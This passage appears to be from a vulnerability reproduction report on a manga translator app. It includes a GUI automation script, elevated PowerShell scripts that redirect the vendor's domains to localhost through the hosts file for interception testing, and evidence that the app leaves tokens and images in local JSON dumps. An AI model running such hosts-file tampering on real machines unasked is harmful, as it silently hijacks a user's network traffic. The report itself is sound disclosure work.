        send_keys("sk-DANGO-MITM-FAKE-KEY-42bd86232c97c8bf", with_spaces=True)
        time.sleep(0.5)
        log("api_key typed")
    shot("07_chatgpt_filled")
    click_btn_named(c, "测试")
    time.sleep(5)
    shot("08_chatgpt_test_result")


def invoke_title_close(w):
    for b in w.descendants(control_type="Button"):
        if (b.window_text() or "") == "关闭":
            b.invoke()
            return True
    return False


def toolbar_btn_by_offset(w, off, name):
    """按源码 x 偏移匹配工具栏按钮: left = win.left + (800-534)*RATE/2 + off*RATE。
    off: settin=80, manga=434。需先悬停使按钮显现。"""
    r = w.rectangle()
    pyautogui.moveTo(r.left + r.width() // 2, r.top + 60, duration=0.4)
    time.sleep(1.0)
    expect = (800 - 534) * RATE / 2 + off * RATE
    best, bestd = None, 1e9
    for b in btns(w):
        try:
            rb = b.rectangle()
            d = abs((rb.left - r.left) - expect)
            if rb.top - r.top <= 40 and 0 < rb.width() < 60 and d < bestd:
                best, bestd = b, d
        except Exception:
            continue
    if best is None or bestd > 25:
        shot("FAIL_toolbar_%s" % name)
        raise RuntimeError("toolbar button %s not matched (best d=%s)" % (name, bestd))
    log("toolbar %s matched, delta=%.1f" % (name, bestd))
    try:
        best.invoke()
    except Exception:
        rb = best.rectangle()
        click_xy(rb.left + rb.width() // 2, rb.top + rb.height() // 2)


def stage_manga():
    m0 = win_by(cls="Manga", timeout=3)
    if m0:
        log("manga window already open")
        w = None
    else:
        w = translation_win()
        if not w:
            # clickSettin 会关闭翻译界面; 关掉 Settin 的 closeEvent 会把它带回来
            s = win_by(cls="Settin", timeout=8)
            if s:
                invoke_title_close(s)
                time.sleep(2)
            w = translation_win()
        if not w:
            raise RuntimeError("translation window not found")
        w.set_focus()
        time.sleep(0.6)
        toolbar_btn_by_offset(w, 434, "manga")   # width+434 = 图片翻译键
        time.sleep(3)
    m = win_by(cls="Manga", timeout=20)
    if not m:
        shot("FAIL_no_manga_win")
        raise RuntimeError("manga window not found")
    log("manga window:", m.window_text())
    time.sleep(2)
    shot("09_manga_window")

    # 导入原图: 按钮→菜单"从文件导入"(↓+Enter)→文件对话框输入路径
    m.set_focus()
    time.sleep(0.5)
    click_btn_named(m, "导入原图")
    time.sleep(1.2)
    send_keys("{DOWN}")
    time.sleep(0.4)
    send_keys("{ENTER}")
    time.sleep(2.5)
    shot("10_file_dialog")
    send_keys("F:\\Disassertation\\PySAST\\PySAST-repro\\unresolved-repro\\_win_dango\\manga_test.png", with_spaces=True)
    time.sleep(0.6)
    send_keys("{ENTER}")
    log("typed image path + enter")
    time.sleep(3)
    shot("11_image_imported")

    # 一键翻译: 菜单 ↓↓+Enter = "全部重新翻译"
    click_btn_named(m, "一键翻译")
    time.sleep(1.2)
    send_keys("{DOWN}")
    time.sleep(0.3)
    send_keys("{DOWN}")
    time.sleep(0.3)
    send_keys("{ENTER}")
    log("triggered 全部重新翻译")
    time.sleep(15)
    shot("12_manga_trans_done")
    for f in ("ocr.json", "ipt.json", "rdr.json"):
        p = os.path.join(APPDIR, f)
        log("%s exists=%s size=%s" % (f, os.path.exists(p),
                                      os.path.getsize(p) if os.path.exists(p) else 0))


def stage_update_click():
    fb = win_by("字体文件缺失", timeout=25)
    if fb:
        click_btn_named(fb, "忽略")
        log("font box dismissed")
        time.sleep(1)
    b = win_by("检查版本更新", timeout=60)
    if not b:
        shot("FAIL_no_version_box")
        raise RuntimeError("version check box not found")
    log("version box found:", b.window_text())
    try:
        texts = [t.window_text() for t in b.descendants(control_type="Text")]
        log("box texts:", texts)
    except Exception:
        pass
    shot("13_version_update_box")
    click_btn_named(b, "好滴")
    log("clicked 好滴 -> updateVersion() -> 自动更新程序.exe")


def stage_kill():
    try:
        subprocess.run(["taskkill", "/F", "/T", "/PID", str(app_pid())], capture_output=True)
        log("app killed")
    except Exception as e:
        log("kill error:", e)


if __name__ == "__main__":
    stage = sys.argv[1] if len(sys.argv) > 1 else ""
    try:
        {"launch": stage_launch, "login": stage_login, "ocrtest": stage_ocrtest,
         "chatgpt": stage_chatgpt, "manga": stage_manga,
         "update-click": stage_update_click, "kill": stage_kill}[stage]()
        log("STAGE %s DONE" % stage)
    except Exception:
        log("STAGE %s FAILED:\n%s" % (stage, traceback.format_exc()))
        shot("FAIL_%s" % stage)
        sys.exit(1)
```

### `mitm/fix_hosts.ps1`

```powershell
$ErrorActionPreference = 'Continue'
$out = 'F:\Disassertation\PySAST\PySAST-repro\unresolved-repro\_win_dango\evidence\uac_fix_result.txt'
$hostsP = Join-Path $env:SystemRoot 'System32\drivers\etc\hosts'
$entries = @(
  '127.0.0.1 trans.dango.cloud # DANGO-MITM-REPRO',
  '127.0.0.1 dango.c4a15wh.cn # DANGO-MITM-REPRO',
  '127.0.0.1 dl.ap-sh.starivercs.cn # DANGO-MITM-REPRO',
  '127.0.0.1 capiv1.ap-sh.starivercs.cn # DANGO-MITM-REPRO'
)
$lines = [System.IO.File]::ReadAllLines($hostsP)
foreach ($e in $entries) {
  $dom = ($e -split '\s+')[1]
  $found = $false
  foreach ($l in $lines) { if ($l -match ('^\s*127\.0\.0\.1\s+' + [regex]::Escape($dom) + '\s')) { $found = $true; break } }
  if (-not $found) {
    [System.IO.File]::AppendAllText($hostsP, "`r`n$e")
    "ADDED: $e" | Out-File $out -Append -Encoding utf8
  } else { "PRESENT: $dom" | Out-File $out -Append -Encoding utf8 }
}
"FINAL-CONTENT:" | Out-File $out -Append -Encoding utf8
[System.IO.File]::ReadAllLines($hostsP) | Where-Object { $_ -match 'DANGO-MITM-REPRO' } | Out-File $out -Append -Encoding utf8
"DONE" | Out-File $out -Append -Encoding utf8
```

### `mitm/restore_hosts.ps1`

```powershell
# DANGO-MITM-REPRO: restore hosts + remove firewall rule (elevated)
$ErrorActionPreference = 'Continue'
$out    = 'F:\Disassertation\PySAST\PySAST-repro\unresolved-repro\_win_dango\evidence\uac_restore_result.txt'
$hostsP = Join-Path $env:SystemRoot 'System32\drivers\etc\hosts'
$backup = 'F:\Disassertation\PySAST\PySAST-repro\unresolved-repro\_win_dango\evidence\hosts.backup.txt'

Copy-Item $backup $hostsP -Force
"RESTORED hosts from $backup" | Out-File $out -Encoding utf8
try {
  Remove-NetFirewallRule -DisplayName 'DANGO-MITM-BLOCK-FALLBACK-IP' -ErrorAction Stop
  "FW-RULE-REMOVED" | Out-File $out -Append -Encoding utf8
} catch { "FW-RULE-REMOVE-FAIL: $_" | Out-File $out -Append -Encoding utf8 }
$left = Select-String -Path $hostsP -Pattern 'DANGO-MITM-REPRO'
if ($left) { "LEFTOVER-ENTRIES-FOUND" | Out-File $out -Append -Encoding utf8; $left | Out-File $out -Append -Encoding utf8 }
else { "VERIFY-OK: no DANGO-MITM-REPRO entries remain" | Out-File $out -Append -Encoding utf8 }
"DONE" | Out-File $out -Append -Encoding utf8
```

</details>

## Execution result

Real GUI manga translation created ocr.json (877 bytes), ipt.json (809 bytes) and rdr.json (1,951 bytes), containing the synthetic token/image data; the files remained after exit. MITM was only shared test infrastructure and is not a prerequisite for this local persistence issue.

Recorded output below is preserved verbatim, including original annotations and synthetic fixture credentials. Interpret it with the limits above.

### `observed-output-1`

```text
[evidence/] ocr.json 877B  ipt.json 809B  rdr.json 1951B  (deploy\app\ 工作目录真实生成, 进程退出后留存)
ocr.json: {"token": "DANGO-FAKE-TOKEN-42bd86232c97c8bf", "mask": "iVBORw0...", "refine": true, ...,
           "image": "iVBORw0KGgoAAAANSUhEUgAAAMgAAABQCAIAAADT...(624 字符整图 base64)"}
```

## Suggested fix

Remove unconditional request dumps. If diagnostics are explicitly enabled, redact credentials and images, use restricted temporary storage, and implement reliable cleanup.
